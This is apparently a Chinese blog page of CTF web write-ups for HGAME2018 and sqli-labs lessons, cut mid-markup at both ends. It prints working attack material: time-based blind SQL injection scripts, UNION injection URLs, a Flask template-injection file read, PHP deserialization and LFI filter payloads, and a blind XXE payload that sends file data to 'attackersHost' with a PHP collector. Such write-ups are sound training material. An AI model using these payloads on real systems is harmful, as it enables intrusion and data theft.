class="line"></span><br><span class="line">// <span class="built_in">echo</span> <span class="variable">$rs</span>[<span class="string">'flag'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$username</span> . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"因为出题人太懒了，所以现在没有任何功能"</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
<p>看起来觉得像是cookie注入，还需要进行base64加密，重新进入index.php抓包进行分析，先进性一次url解码然后再base64解码后发现是guest。<br>所以这里切换为admin，然后base64加密，YWRtaW4=，等号用%3d进行绕过测试，界面变成了hello admin，so…应该就是cookie注入,所以写脚本注入。<br>首先判断数据库的长度：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment">#test the length of database.</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	<span class="attribute">url</span>=<span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">		<span class="attribute">r</span>=requests.session()</span><br><span class="line">		<span class="attribute">payload</span>=<span class="string">"admin' or if(length(database())="</span>+str(i)+",1,sleep(3))#"</span><br><span class="line">		cookie=&#123;<span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))&#125;</span><br><span class="line">		<span class="attribute">start_time</span>=time.time()</span><br><span class="line">		r.post(<span class="attribute">url</span>=url,cookies=cookie)</span><br><span class="line">		<span class="keyword">if</span> time.time()-start_time&lt;2:</span><br><span class="line">			<span class="builtin-name">print</span> <span class="string">"The length of database is "</span>,i</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>=="__main__":</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>数据库长度为4，然后就是一系列的查找什么的…<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p>但是我觉得这样做一道题感觉有些麻烦，我在想能不能减少一些步骤来提高效率，so我找到了一份大师傅的WP，对比一下我发现大师傅和我做的不一样的是大师傅没有直接跑出对应表/列的长度，而是定义了一个比较大的数字直接运行。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">url = <span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,1000):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((),%s,1))=%s),sleep(3),false)#"</span>%(i,j)  user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(3),false)#"</span>%(i,j) user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        payload = <span class="string">"admin' or if((ascii(substr((select flag from user limit 2,1),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        cookie = &#123;</span><br><span class="line">            <span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url,cookies=cookie,timeout=2.5)</span><br><span class="line">        except:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            <span class="builtin-name">print</span> flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<p>大师傅博客链接：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/<span class="number">2018</span>/<span class="number">02</span>/<span class="number">21</span>/week<span class="number">3</span>-hgame<span class="symbol">%E4</span><span class="symbol">%B9</span><span class="symbol">%8</span>Bweb<span class="symbol">%E7</span><span class="symbol">%B2</span><span class="symbol">%97</span><span class="symbol">%E7</span><span class="symbol">%95</span><span class="symbol">%A5</span><span class="symbol">%E8</span><span class="symbol">%AE</span><span class="symbol">%B0</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span>/#week<span class="number">3</span>-<span class="symbol">%E4</span><span class="symbol">%B9</span><span class="symbol">%A6</span><span class="symbol">%E5</span><span class="symbol">%BA</span><span class="symbol">%97</span></span><br></pre></td></tr></table></figure></p>
<h2 id="简单的SQLi"><a href="#简单的SQLi" class="headerlink" title="简单的SQLi"></a>简单的SQLi</h2><p>这道不太会…（拿出小本本记好），等一等wp。</p>
<h2 id="送分的SQLi"><a href="#送分的SQLi" class="headerlink" title="送分的SQLi"></a>送分的SQLi</h2><p>id=1这里是注入点，然后常规注入就行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10068/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>爆出表：f111aa4g,users<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10068/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x6631313161613467</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>爆出列：id,dajiangyoude,f111aaaggg_w3<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/118.25.18.223:10068/</span>?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">f111aaaggg_w3</span> <span class="title">from</span> <span class="title">f111aa4g</span>%23</span></span><br></pre></td></tr></table></figure></p>
<p>这样就能拿到flag。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Th3_e4sist_sql_injeCti0n##&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="ngc’s-blog"><a href="#ngc’s-blog" class="headerlink" title="ngc’s blog"></a>ngc’s blog</h2><p>这是一道基于Python的模板注入…可以直接google搜索Flask漏洞…下面就是一大堆…所以对当前URL进行测试。<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.230</span>.<span class="number">105.104</span>:<span class="number">5000</span>/&#123;&#123;<span class="string">'abcd'</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg" alt=""><br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.230</span>.<span class="number">105.104</span>:<span class="number">5000</span>/&#123;&#123;<span class="string">'abcd'</span>.upper()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后发现abcd这四个字母变成了大写字母…通过这里发现能够进行代码执行…<br><img src="https://i.loli.net/2018/03/03/5a9a9fe59401e.jpg" alt=""><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现这里返回出了两个东西，but好像没什么用…<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://111.230.105.104:5000/&#123;&#123;''.__class__.__mro__</span>[<span class="string">2</span>]._<span class="emphasis">_subclasses_</span><span class="emphasis">_()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>通过这样的方法就能看到所有类<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/03/03/5a9a9fe5b650f.jpg" alt=""><br>提示说flag在flag里面，所以读取…OK拿到flag…<br><img src="https://i.loli.net/2018/03/03/5a9a9fe5be804.jpg" alt=""><br>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>drops.xmd5.com<span class="regexp">/static/</span>drops<span class="regexp">/tips-13683.html</span></span><br></pre></td></tr></table></figure></p>
<h2 id="书店"><a href="#书店" class="headerlink" title="**书店"></a>**书店</h2><p>题目上已经给出来了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     不喜欢我推荐的？那就把你喜欢的传上来看看啊</span></span><br><span class="line"><span class="comment">     &lt;input name="a" type="text"&gt;</span></span><br><span class="line"><span class="comment">     我只收经过base64的xml格式的书哦</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>所以这很明显是一个xml注入攻击，根据题目提示flag在/a/b下面，所以这是一个外部实体注入的xml,先构建xml攻击语句。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY w SYSTEM "file:///a/b"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;w;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>base64加密以后post数据…然而…什么回显都没有，想想这题250分，应该没这么简单，那就是Blind XXE了。<br>所以重新构造…<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE ANY[</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">a</span>/<span class="attr">b</span>"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">attackersHost</span>/<span class="attr">xxe.xml</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%remote;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">%all;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> % <span class="keyword">all</span> <span class="string">"&lt;!ENTITY send SYSTEM 'http://attackersHost/xxe.php?data=%data;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123;</span></span><br><span class="line"><span class="php">    file_put_contents(<span class="string">'data'</span>, $_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/u011721501/</span>article<span class="regexp">/details/</span><span class="number">43775691</span></span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/" data-id="cjk0t3ve4000d9cv41ahkzrti" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HGAME2018-Week-2-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/27/HGAME2018-Week-2-Writeup/" class="article-date">
  <time datetime="2018-02-27T11:20:39.000Z" itemprop="datePublished">2018-02-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/27/HGAME2018-Week-2-Writeup/">HGAME2018 Week-2 Web Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>点开链接以后里面啥都没有…所以猜测这里一定有源码泄露什么的，所以/.random.php.swp就能get源码，Notepad++打开以后发现源码是损坏的，所以需要对源码进行修复，因为是.swp，所以直接扔到Ubuntu里面 vim -r就OK。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> (<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $public;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $secret;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_GET[<span class="string">'emmm'</span>]) &#123;</span></span><br><span class="line"><span class="php">    $emmm = unserialize($_GET[<span class="string">'emmm'</span>]);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_object($emmm)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $emmm-&gt;public = random_int(<span class="number">0</span>, <span class="number">100000000</span>);</span></span><br><span class="line"><span class="php">    $emmm-&gt;secret = random_int(<span class="number">0</span>, <span class="number">100000000</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($emmm-&gt;public == $emmm-&gt;secret) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">#highlight_file(__FILE__);</span></span></span><br></pre></td></tr></table></figure></p>
<p>好咯，这里就是代码审计的过程，通过$_GET的方式来获取emmm的值，在序列化解析，如果序列化解析后emmm是一个对象，那就退出，所以这里要先对emmm进行序列化操作。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $public;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $secret;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$emmm=<span class="keyword">new</span> emmm();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($emmm);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>序列化以后的结果是：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"emmm"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">6</span>:<span class="string">"public"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"secret"</span>;N;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着往下审计，这里需要public的值和secret的值相等，php支持引用赋值，因为secret的编号为2，所以进行赋值的序列化语句需要进行相关修改。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"emmm"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">6</span>:<span class="string">"public"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"secret"</span>;<span class="string">R:</span><span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>php中-&gt;对象引用（r）,指针引用（R）<br>这里强烈推荐刺珩师傅的博客，搜反序列化构造的时候能看到这篇博客很惊喜：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>c1h3ng.github.io<span class="regexp">/php/</span><span class="number">2017</span><span class="regexp">/09/</span><span class="number">20</span><span class="regexp">/php-serialize/</span></span><br></pre></td></tr></table></figure></p>
<h2 id="草莓社区-1"><a href="#草莓社区-1" class="headerlink" title="草莓社区-1"></a>草莓社区-1</h2><p>这个题已经提示了是本地包含，首页的index.html下面有两个链接，其中一个链接是show_maopian.php?mao=2.jpg，因为LFI，所以直接mao=../flag.php就能拿到flag.php的base64，解密以后就是flag。</p>
<h2 id="草莓社区-2"><a href="#草莓社区-2" class="headerlink" title="草莓社区-2"></a>草莓社区-2</h2><p>哭晕在厕所我做的是对的，因为火狐的问题显示不出来我还以为我做错了，直到我扔到了Chrome…<br>题目提示LFI，所以开始测试LFI，php://input没有反应，但是测试php://filter/read=convert.base64-encode/resource=../flag.php，在火狐的查看元素里面查看参数发现read等号后面的全部被过滤掉了，所以对等号进行url编码，%3d进行绕过。<br>payload:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mao=php://<span class="keyword">filter</span>/read<span class="symbol">%3</span>dconvert.base<span class="number">64</span>-encode/resource<span class="symbol">%3</span>d../flag.php</span><br></pre></td></tr></table></figure></p>
<p>然后扔到Chrome里面就有flag的加密base64，解密一下就好。<br><img src="https://i.loli.net/2018/02/27/5a9540e4e41d5.jpg" alt=""></p>
<h2 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h2><h2 id="xss-2"><a href="#xss-2" class="headerlink" title="xss-2"></a>xss-2</h2><p>两道xss没做，等我重新学习一下就解决这两题。</p>
<h2 id="最简单的sql题"><a href="#最简单的sql题" class="headerlink" title="最简单的sql题"></a>最简单的sql题</h2><p>这题真的好简单…看到登录框我以为可能需要写个脚本啥的，然后开始测试admin’#，密码随便输的，然后就有flag了。</p>
<p>写在最后…这次HGAME2018的flag放出来我的Hexo就报错，我也懒截图了，所以把flag全删了…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/27/HGAME2018-Week-2-Writeup/" data-id="cjk0t3ve300099cv43c4c3rhp" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sqlilabs-Less8-Less10-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/20/sqlilabs-Less8-Less10-writeup/" class="article-date">
  <time datetime="2018-02-20T01:57:57.000Z" itemprop="datePublished">2018-02-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞学习/">漏洞学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/20/sqlilabs-Less8-Less10-writeup/">sqlilabs Less8~Less10 writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p><img src="https://i.loli.net/2018/02/20/5a8b82bf4ff56.jpg" alt=""><br>Less-8做法和Less-5完全一样，加单引号绕过，还是盲注，这里可以参考之前的博客：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p><img src="https://i.loli.net/2018/02/20/5a8b8a220132f.jpg" alt=""><br>从Less-9的标题可以看出，Less-9是时间盲注，Less-6的时候有写过使用时间盲注的脚本，但是Less-9提升了一点难度，无论怎么都返回的是“You are in”，并且这里是单引号注入，所以这里需要对脚本进行相关修改。<br>首先对数据库长度进行测试：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/<span class="keyword">Less</span>-<span class="number">9</span>/?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">If</span>(length(database())=<span class="number">5</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>F12查看元素发现时间为6.12s<br><img src="https://i.loli.net/2018/02/20/5a8b93ca041dc.jpg" alt=""><br>当测试到数据库长度为8的时候，时间返回为1.10s，说明这里并没有进行延时，所以数据库长度为8。<br><img src="https://i.loli.net/2018/02/20/5a8b93ca099ca.jpg" alt=""><br>写脚本的时候和Less-6比起来的改动只在于加入了一个time块来比较当前时间和运行时间的间隔，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Because sometimes some page will return the same content weather the input is different.</span></span><br><span class="line"><span class="string">That's why I write this program to detect the right information.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	r=requests.session()</span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-9/?id=1' "</span>+payload</span><br><span class="line">	start_time=time.time()</span><br><span class="line">	r.post(url)</span><br><span class="line">	<span class="keyword">if</span> time.time()-start_time &lt;<span class="number">5</span>:</span><br><span class="line">		<span class="comment">#if time don't delay 5 seconds,which means right</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_length</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if(length(database())="</span>+str(i)+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">		<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The length of databse is "</span>,i</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890_abcdefghijklmnopqrstuvwxyz@ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	db_length=get_db_length()</span><br><span class="line">	<span class="keyword">if</span> db_length != <span class="keyword">None</span>:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(db_length+<span class="number">1</span>):</span><br><span class="line">			<span class="comment">#Because the database's name count from number 1,length add 1.</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				payload=<span class="string">"and If(ascii(substr(database(),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(char))+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">				<span class="keyword">if</span>(send_data(payload)):</span><br><span 